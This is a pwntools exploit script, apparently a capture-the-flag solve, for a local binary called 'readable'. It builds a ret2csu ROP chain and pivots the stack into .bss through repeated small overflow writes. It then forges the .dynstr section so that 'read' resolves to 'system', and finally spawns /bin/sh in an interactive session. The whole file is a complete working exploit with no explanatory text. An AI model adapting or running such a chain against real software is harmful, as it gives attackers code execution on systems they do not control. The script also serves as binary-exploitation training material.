from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./readable")
rop = ROP("./readable")
elf = ELF("./readable")

bss_addr = elf.bss()
csu_first_addr = 0x40058A
csu_second_addr = 0x400570

def csu_gadget(rbx, rbp, func_ptr, edi, rsi, rdx):
    # rdx = r13
    # rsi = r14
    # rdi = r15d
    # call [r12+rbx*8]
    # set rbx+1=rbp
    return flat([csu_first_addr, rbx, rbp, func_ptr, rdx,
                    rsi, edi, csu_second_addr], arch="amd64")+'a' * 0x38

def read16bytes(targetaddr, content):
    payload = 'a'*16
    payload += p64(targetaddr+0x10)
    payload += p64(0x400505)
    payload += content.ljust(16, "\x00")
    payload += p64(0x600890)
    payload += p64(0x400505)
    return payload

# stack privot to bss segment, set rsp = new_stack
fake_data_addr = bss_addr
new_stack = bss_addr+0x500

# modify .dynstr pointer in .dynamic section to a specific location
rop = csu_gadget(0, 1 ,elf.got['read'],0,0x600778+8,8)
# construct a fake dynstr section
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop += csu_gadget(0, 1 ,elf.got['read'],0,fake_data_addr,len(dynstr))
# read /bin/sh\x00
binsh_addr = fake_data_addr+len(dynstr)
rop += csu_gadget(0, 1 ,elf.got['read'],0,binsh_addr,len("/bin/sh\x00"))
# 0x0000000000400593: pop rdi; ret; 
rop +=p64(0x0000000000400593)+p64(binsh_addr)
# 0x0000000000400590: pop r14; pop r15; ret; 
rop +=p64(0x0000000000400590) +'a'*16 # stack align
# return to the second instruction of read'plt
rop +=p64(0x4003E6)

# gdb.attach(io)
# pause()
for i in range(0,len(rop),16):
    tmp = read16bytes(new_stack+i,rop[i:i+16])
    io.send(tmp)


# jump to the rop
payload = 'a'*16
payload += p64(new_stack-8)
payload += p64(0x400520)  # leave ret
io.send(payload)

# send fake dynstr addr
io.send(p64(fake_data_addr))
# send fake dynstr section
io.send(dynstr)
# send "/bin/sh\x00"
io.send("/bin/sh\x00")
io.interactive()